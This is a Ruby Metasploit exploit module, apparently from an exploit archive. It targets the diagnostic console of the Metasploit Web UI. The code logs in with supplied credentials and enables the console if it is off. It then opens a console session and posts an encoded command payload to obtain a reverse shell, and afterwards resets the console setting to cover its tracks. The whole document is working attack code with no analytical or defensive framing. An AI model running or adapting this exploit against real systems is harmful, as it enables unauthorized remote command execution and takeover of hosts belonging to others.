# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;          => &#039;Metasploit Web UI Diagnostic Console Command Execution&#039;,
      &#039;Description&#039;   => %q{
        This module exploits the "diagnostic console" feature in the Metasploit
        Web UI to obtain a reverse shell.
 
        The diagnostic console is able to be enabled or disabled by an
        administrator on Metasploit Pro and by an authenticated user on
        diagnostic console provides access to msfconsole via the web interface.
        An authenticated user can then use the console to execute shell
        commands.
 
        NOTE: Valid credentials are required for this module.
 
        Tested against:
 
        Metasploit Community 4.1.0,
        Metasploit Community 4.8.2,
        Metasploit Community 4.12.0
      },
      &#039;Author&#039;        => [ &#039;Justin Steven&#039; ],    # @justinsteven
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Privileged&#039;    => true,
      &#039;Arch&#039;          => ARCH_CMD,
      &#039;Payload&#039;       => { &#039;PayloadType&#039;  => &#039;cmd&#039; },
      &#039;Targets&#039;       =>
        [
          [ &#039;Unix&#039;,
            {
              &#039;Platform&#039;   => [ &#039;unix&#039; ]
            }
          ],
          [ &#039;Windows&#039;,
            {
              &#039;Platform&#039;   => [ &#039;windows&#039; ]
            }
          ]
        ],
      &#039;DefaultTarget&#039; => 0,
      &#039;DisclosureDate&#039;  => &#039;Aug 23 2016&#039;
      ))
 
    register_options(
      [
        OptBool.new(&#039;SSL&#039;, [ true, &#039;Use SSL&#039;, true ]),
        OptPort.new(&#039;RPORT&#039;, [ true, &#039;&#039;, 3790 ]),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;Metasploit Web UI base path&#039;, &#039;/&#039; ]),
        OptString.new(&#039;USERNAME&#039;, [ true,  &#039;The user to authenticate as&#039; ]),
        OptString.new(&#039;PASSWORD&#039;, [ true,  &#039;The password to authenticate with&#039; ])
      ], self.class)
  end
 
  def do_login()
 
    print_status(&#039;Obtaining cookies and authenticity_token&#039;)
 
    res = send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;login&#039;),
    })
 
    unless res
      fail_with(Failure::NotFound, &#039;Failed to retrieve login page&#039;)
    end
 
    unless res.headers.include?(&#039;Set-Cookie&#039;) && res.body =~ /name="authenticity_token"\W+.*\bvalue="([^"]*)"/
      fail_with(Failure::UnexpectedReply, "Couldn&#039;t find cookies or authenticity_token. Is TARGETURI set correctly?")
    end
 
    authenticity_token = $1
    session = res.get_cookies
 
    print_status(&#039;Logging in&#039;)
 
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;user_sessions&#039;),
      &#039;cookie&#039;    => session,
      &#039;vars_post&#039; =>
        {
          &#039;utf8&#039;                    => &#039;\xE2\x9C\x93&#039;,
          &#039;authenticity_token&#039;      => authenticity_token,
          &#039;user_session[username]&#039;  => datastore[&#039;USERNAME&#039;],
          &#039;user_session[password]&#039;  => datastore[&#039;PASSWORD&#039;],
          &#039;commit&#039;                  => &#039;Sign in&#039;
        }
    })
 
    unless res
      fail_with(Failure::NotFound, &#039;Failed to log in&#039;)
    end
 
    return res.get_cookies, authenticity_token
 
  end
 
  def get_console_status(session)
 
    print_status(&#039;Getting diagnostic console status and profile_id&#039;)
 
    res = send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;settings&#039;),
      &#039;cookie&#039;    => session,
    })
 
    unless res
      fail_with(Failure::NotFound, &#039;Failed to get diagnostic console status or profile_id&#039;)
    end
 
    unless res.body =~ /\bid="profile_id"\W+.*\bvalue="([^"]*)"/
      fail_with(Failure::UnexpectedReply, &#039;Failed to get profile_id&#039;)
    end
 
    profile_id = $1
 
    if res.body =~ /<input\W+.*\b(id="allow_console_access"\W+.*\bchecked="checked"|checked="checked"\W+.*\bid="allow_console_access")/
      console_status = true
    elsif res.body =~ /<input\W+.*\bid="allow_console_access"/
      console_status = false
    else
      fail_with(Failure::UnexpectedReply, &#039;Failed to get diagnostic console status&#039;)
    end
 
    print_good("Console is currently: #{console_status ? &#039;Enabled&#039; : &#039;Disabled&#039;}")
 
    return console_status, profile_id
 
  end
 
  def set_console_status(session, authenticity_token, profile_id, new_console_status)
    print_status("#{new_console_status ? &#039;Enabling&#039; : &#039;Disabling&#039;} diagnostic console")
 
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;settings&#039;, &#039;update_profile&#039;),
      &#039;cookie&#039;    => session,
      &#039;vars_post&#039; =>
        {
          &#039;utf8&#039;                    => &#039;\xE2\x9C\x93&#039;,
          &#039;_method&#039;                 => &#039;patch&#039;,
          &#039;authenticity_token&#039;      => authenticity_token,
          &#039;profile_id&#039;              => profile_id,
          &#039;allow_console_access&#039;    => new_console_status,
          &#039;commit&#039;                  => &#039;Update Settings&#039;
        }
    })
 
    unless res
      fail_with(Failure::NotFound, &#039;Failed to set status of diagnostic console&#039;)
    end
 
  end
 
  def get_container_id(session, container_label)
 
    container_label_singular = container_label.gsub(/s$/, "")
 
    print_status("Getting ID of a valid #{container_label_singular}")
 
    res = send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, container_label),
      &#039;cookie&#039;    => session,
    })
 
    unless res && res.body =~ /\bid="#{container_label_singular}_([^"]*)"/
      print_warning("Failed to get a valid #{container_label_singular} ID")
      return
    end
 
    container_id = $1
 
    vprint_good("Got: #{container_id}")
 
    container_id
 
  end
 
  def get_console(session, container_label, container_id)
 
    print_status(&#039;Creating a console, getting its ID and authenticity_token&#039;)
 
    res = send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, container_label, container_id, &#039;console&#039;),
      &#039;cookie&#039;    => session,
    })
 
    unless res && res.headers[&#039;location&#039;]
      fail_with(Failure::UnexpectedReply, &#039;Failed to get a console ID&#039;)
    end
 
    console_id = res.headers[&#039;location&#039;].split(&#039;/&#039;)[-1]
 
    vprint_good("Got console ID: #{console_id}")
 
    res = send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, container_label, container_id, &#039;consoles&#039;, console_id),
      &#039;cookie&#039;    => session,
    })
 
    unless res && res.body =~ /console_init\(&#039;console&#039;, &#039;console&#039;, &#039;([^&#039;]*)&#039;/
      fail_with(Failure::UnexpectedReply, &#039;Failed to get console authenticity_token&#039;)
    end
 
    console_authenticity_token = $1
 
    return console_id, console_authenticity_token
 
  end
 
  def run_command(session, container_label, console_authenticity_token, container_id, console_id, command)
 
    print_status(&#039;Running payload&#039;)
 
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, container_label, container_id, &#039;consoles&#039;, console_id),
      &#039;cookie&#039;    => session,
      &#039;vars_post&#039; =>
        {
          &#039;read&#039;                    => &#039;yes&#039;,
          &#039;cmd&#039;                     => command,
          &#039;authenticity_token&#039;      => console_authenticity_token,
          &#039;last_event&#039;              => &#039;0&#039;,
          &#039;_&#039;                       => &#039;&#039;
        }
    })
 
    unless res
      fail_with(Failure::NotFound, &#039;Failed to run command&#039;)
    end
 
  end
 
  def exploit
 
    session, authenticity_token = do_login()
 
    original_console_status, profile_id = get_console_status(session)
 
    unless original_console_status
      set_console_status(session, authenticity_token, profile_id, true)
    end
 
    if container_id = get_container_id(session, "workspaces")
      # target calls them "workspaces"
      container_label = "workspaces"
    elsif container_id = get_container_id(session, "projects")
      # target calls them "projects"
      container_label = "projects"
    else
      fail_with(Failure::Unknown, &#039;Failed to get workspace ID or project ID. Cannot continue.&#039;)
    end
 
    console_id, console_authenticity_token = get_console(session, container_label,container_id)
 
    run_command(session, container_label, console_authenticity_token,
                container_id, console_id, payload.encoded)
 
    unless original_console_status
      set_console_status(session, authenticity_token, profile_id, false)
    end
 
    handler
 
  end
 
end

